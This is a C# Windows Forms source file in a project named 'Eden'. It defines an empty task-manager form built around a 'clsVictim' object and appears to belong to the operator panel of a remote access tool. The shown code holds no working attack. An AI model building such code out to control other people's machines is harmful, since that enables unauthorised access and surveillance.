using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmTaskMgr : Form
    {
        private clsVictim m_victim;
        public string m_szVictimID;

        public frmTaskMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;
        }

        private void frmTaskMgr_Load(object sender, EventArgs e)
        {

        }
    }
}
